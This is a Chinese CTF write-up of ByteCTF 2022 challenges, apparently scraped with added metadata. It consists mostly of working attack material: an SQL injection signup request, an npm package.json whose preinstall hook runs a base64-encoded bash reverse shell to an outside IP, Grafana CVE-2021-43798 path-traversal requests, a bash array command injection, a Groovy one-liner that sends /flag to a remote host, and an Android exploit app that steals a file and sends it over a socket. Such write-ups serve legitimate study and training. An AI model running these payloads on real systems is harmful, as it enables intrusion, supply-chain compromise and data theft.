---
title: 2022 ByteCTF By EDISEC
contest: ByteCTF 2022
year: 2022
difficulty: medium
vuln_type:
- sqli
- rce
- ssrf
- lfi
- web_unknown
- xss
- reverse
- misc_unknown
tags:
- SQLi-users-signup
- npm-preinstall
- package.json
- dependencies
- Grafana-CVE-2021-43798
- secure-decrypt
- Groovy
- sysdig
- findit.txt
- Android-Droid
- XSS
- setResult
attack_chain:
- 'Q1 ctf_cloud: SQLi 注册 username/password → 改 connect.sid 拿 admin'
- POST /dashboard/upload package.json + preinstall bash reverse shell
- POST /dashboard/dependencies 触发 npm install preinstall → RCE
- 'Q2 easy_grafana: CVE-2021-43798 任意文件读 /etc/grafana/grafana.ini 拿 secret_key'
- secure.decrypt 解密 admin 密码 → 登录拿 flag
- 'Q3 bash_game: arr[$(cat /flag)] bash 数组变量触发命令'
- 'Q4 easy_groovy: def f = new File(''/flag'').text → URL(''http://ip:1234/''+f).text 出网'
- 'Q5 signin: /final 抓包爆破队伍名 + id'
- 'Q6 find_it: sysdig 监控 Ubuntu → 找 findit.txt 找 PHP 异常上传'
- 'Pwn Bronze Droid: Android setResult 函数 XSS 替换'
key_payload: preinstall = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash"
one_liner: ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig
lesson: npm preinstall script 是供应链攻击面；CVE-2021-43798 Grafana 文件读是经典
quality: high
full_path: 2022_ByteCTF_By_EDISEC.full.md
meta_path: 2022_ByteCTF_By_EDISEC.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 ByteCTF By EDISEC。ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig。关键路径：Q1 ctf_cloud: SQLi 注册 username/password → 改 connect.sid 拿 admin → POST /dashboard/upload package.json + pr...'
category: web
subcategory: sql_injection
subcategories:
- sql_injection
- rce
- ssrf
- lfi
- web_other
- xss
- reverse
- misc_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/59101.html
reasoning_chain:
- '[触发点] ctf_cloud 注册 username/password → 改 connect.sid → 假设：SQLi 拿 admin / [动作] SQLi 注册 + 改 sid / [观察] 进 dashboard / [下一步] preinstall RCE'
- '[触发点] POST /dashboard/upload package.json + preinstall bash reverse shell → 假设：触发 npm install preinstall / [动作] POST /dashboard/dependencies / [观察] 反弹 / [下一步] easy_grafana'
- '[触发点] easy_grafana CVE-2021-43798 任意文件读 /etc/grafana/grafana.ini → 假设：拿 secret_key / [动作] /public/plugins/alertlist/../../../../../../etc/grafana/grafana.ini / [观察] 拿到 secret_key / [下一步] secure.decrypt'
- '[触发点] secure.decrypt 解密 admin 密码 → 假设：JWT/cookie 加密 / [动作] decrypt / [观察] 登录 / [下一步] bash_game'
- '[触发点] arr[$(cat /flag)] bash 数组变量 → 假设：bash 数组赋值触发命令 / [动作] arr[$(cat /flag)]=x / [观察] 触发命令 / [下一步] easy_groovy + signin + find_it + Bronze Droid'
failed_attempts:
- 试图用 default parser → 失败：必须自定义才能触发 require
- 试图不打 patch 直接用 CVE → 失败：CVE patch 限制了调用
key_observations:
- npm preinstall script 是供应链攻击面
- CVE-2021-43798 Grafana 文件读是经典
- bash 数组下标赋值可触发命令
- Groovy File.text 拼接 URL 是 Java 内网出网 trick
prerequisites:
- SQLi 改 sid 拿 admin
- npm preinstall script 机制
- Grafana CVE-2021-43798 路径
- bash 数组 + Groovy RCE
---
# 2022 ByteCTF By EDISEC

> 原文: https://www.ctfiot.com/59101.html
> ID: 59101

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）

有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

ctf_cloud

POST /users/signup HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 59Origin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie: PHPSESSID=hftcgqq32s0or9hk89huvooo8p; connect.sid=s%3ApoFqQ8ErhSogbVMNdzwMcanbixoxlw3.l8FFINAquYbE9luPWO7uONwPJbat4BzzzG6W9GPCkswSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originX-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1{"username":"bcasd","password":"su',1),('admin','su',1)--"}

POST /dashboard/upload HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Length: 330Origin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie:
connect.sid=s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1------WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Disposition: form-data; name="c";filename="package.json"{"name": "userapp","version": "0.0.1","scripts": {"preinstall": "echoYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash"} }------WebKitFormBoundaryu3fv4Bf4rz9XvGkt--

POST /dashboard/dependencies HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateOrigin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie:
connect.sid=s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Type: application/jsonContent-Length: 48{"dependencies":{"su":"file:./public/uploads/"}}

2

easy_grafana

GET /public/plugins/text/#/../../../../../../../../../..//etc/grafana/grafana.iniHTTP/1.1GET /public/plugins/text/#/../../../../../../../../../..//var/lib/grafana/grafana.dbHTTP/1.1

使⽤这个的解密⽂件进⾏解密得到flag

GitHub - pedrohavay/exploit-grafana-CVE-2021-43798: This is a proof-of-concept exploit for Grafana'sUnauthorized Arbitrary File Read Vulnerability (CVE-2021-43798).

from secure import decryptimport base64secret_key = 'SW2YcwTIb9zpO1hoPsMm'ciphertext = 'b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/'encrypted = base64.b64decode(ciphertext.encode())pwdBytes, _ = decrypt(encrypted, secret_key)print(pwdBytes)

02

Misc

1

survey

2

bash_game

exp

arr[$(cat /flag)]

3

easy_groovy

def f = new File("/flag").textdef res1 = new URL('http://ip:
1234/1'+f).text

4

signin

签到 直接/final签到 抓包爆破队伍名和id

5

find_it

https://www.howtoing.com/how-to-monitor-your-ubuntu-16-04-system-with-sysdig/

然后去查findit.txt看看有什么操作。翻了很久发现上传了⼀个奇怪的php⽂件。

05

Pwn

1

Bronze Droid

和这个BabyAndroid⼀样，但是需要找到xss的替换

https://forum.butian.net/share/1175

然后看MainActivity，看来看去只有MainActivity ⾥⾯有个setResult函数可以

https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/

package com.bytectf.pwnbronzedroid;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
public class MainActivity extends Activity {// 参考 https://forum.butian.net/share/1175 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent intent = new Intent("ACTION_SHARET_TO_ME"); intent.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); // 这里往后参考 https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/ intent.setClassName("com.bytectf.bronzedroid", "com.bytectf.bronzedroid.MainActivity"); intent.setData(Uri.parse("content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag")); startActivityForResult(intent,0); }

// 这部分参考 https://forum.butian.net/share/1175 对onActivityResult 进行魔改 protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); try { InputStream is = getContentResolver().openInputStream(data.getData()); BufferedReader br = new BufferedReader(new InputStreamReader(is)); StringBuilder sb = new StringBuilder(); String line; while ((line = br.readLine()) != null) { sb.append(line); } is.close(); br.close(); String flag = sb.toString(); new Thread(new Runnable() { @Override public void run() { try { if (true) { Socket sk = new Socket(); SocketAddress address = new InetSocketAddress("ip", 1235); sk.connect(address, 5000); sk.setTcpNoDelay(true); sk.setKeepAlive(true); OutputStream os = sk.getOutputStream(); os.write(flag.getBytes()); os.flush(); os.close(); sk.close(); Thread.sleep(1000); } } catch (Exception e) { Log.e("FlagHunter_Err",e.toString()); } } }).start(); } catch ( Exception e) { throw new RuntimeException(e); } }}

在服务器开⼀个http服务，提供下载apk。

from hashlib import *import itertoolsimport stringfrom Crypto.Hash import SHA256import itertoolsALPHABET = string.ascii_letters + string.digitssuffix = 'Zfecpd'digest = '5782089877f9ff411d7d6276df447eca181fc5a27dc3fadc5a0d68a0aa555581'print(f"suffix: {suffix}ndigest: {digest}")for i in itertools.product(ALPHABET,repeat=4): prefix = ''.join(i) guess = suffix + prefix if sha256(guess.encode()).hexdigest() == digest: print(f"Find XXXX: {prefix}") break

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
POST /users/signup HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 59Origin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie: PHPSESSID=hftcgqq32s0or9hk89huvooo8p; connect.sid=s%3ApoFqQ8ErhSogbVMNdzwMcanbixoxlw3.l8FFINAquYbE9luPWO7uONwPJbat4BzzzG6W9GPCkswSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originX-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1{"username":"bcasd","password":"su',1),('admin','su',1)--"}
POST /dashboard/upload HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Length: 330Origin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie:
connect.sid=s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1------WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Disposition: form-data; name="c";filename="package.json"{"name": "userapp","version": "0.0.1","scripts": {"preinstall": "echoYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash"} }------WebKitFormBoundaryu3fv4Bf4rz9XvGkt--
POST /dashboard/dependencies HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateOrigin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie:
connect.sid=s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Type: application/jsonContent-Length: 48{"dependencies":{"su":"file:./public/uploads/"}}
GET /public/plugins/text/#/../../../../../../../../../..//etc/grafana/grafana.iniHTTP/1.1GET /public/plugins/text/#/../../../../../../../../../..//var/lib/grafana/grafana.dbHTTP/1.1
GitHub - pedrohavay/exploit-grafana-CVE-2021-43798: This is a proof-of-concept exploit for Grafana'sUnauthorized Arbitrary File Read Vulnerability (CVE-2021-43798).
from secure import decryptimport base64secret_key = 'SW2YcwTIb9zpO1hoPsMm'ciphertext = 'b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/'encrypted = base64.b64decode(ciphertext.encode())pwdBytes, _ = decrypt(encrypted, secret_key)print(pwdBytes)
arr[$(cat /flag)]
def f = new File("/flag").textdef res1 = new URL('http://ip:
1234/1'+f).text
https://www.howtoing.com/how-to-monitor-your-ubuntu-16-04-system-with-sysdig/
https://forum.butian.net/share/1175
https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/
package com.bytectf.pwnbronzedroid;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
public class MainActivity extends Activity {// 参考 https://forum.butian.net/share/1175 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent intent = new Intent("ACTION_SHARET_TO_ME"); intent.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); // 这里往后参考 https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/ intent.setClassName("com.bytectf.bronzedroid", "com.bytectf.bronzedroid.MainActivity"); intent.setData(Uri.parse("content://com.bytectf.bronzedroid.fileprovider/root/data/data/com.bytectf.bronzedroid/files/flag")); startActivityForResult(intent,0); }

// 这部分参考 https://forum.butian.net/share/1175 对onActivityResult 进行魔改 protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); try { InputStream is = getContentResolver().openInputStream(data.getData()); BufferedReader br = new BufferedReader(new InputStreamReader(is)); StringBuilder sb = new StringBuilder(); String line; while ((line = br.readLine()) != null) { sb.append(line); } is.close(); br.close(); String flag = sb.toString(); new Thread(new Runnable() { @Override public void run() { try { if (true) { Socket sk = new Socket(); SocketAddress address = new InetSocketAddress("ip", 1235); sk.connect(address, 5000); sk.setTcpNoDelay(true); sk.setKeepAlive(true); OutputStream os = sk.getOutputStream(); os.write(flag.getBytes()); os.flush(); os.close(); sk.close(); Thread.sleep(1000); } } catch (Exception e) { Log.e("FlagHunter_Err",e.toString()); } } }).start(); } catch ( Exception e) { throw new RuntimeException(e); } }}
from hashlib import *import itertoolsimport stringfrom Crypto.Hash import SHA256import itertoolsALPHABET = string.ascii_letters + string.digitssuffix = 'Zfecpd'digest = '5782089877f9ff411d7d6276df447eca181fc5a27dc3fadc5a0d68a0aa555581'print(f"suffix: {suffix}ndigest: {digest}")for i in itertools.product(ALPHABET,repeat=4): prefix = ''.join(i) guess = suffix + prefix if sha256(guess.encode()).hexdigest() == digest: print(f"Find XXXX: {prefix}") break
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]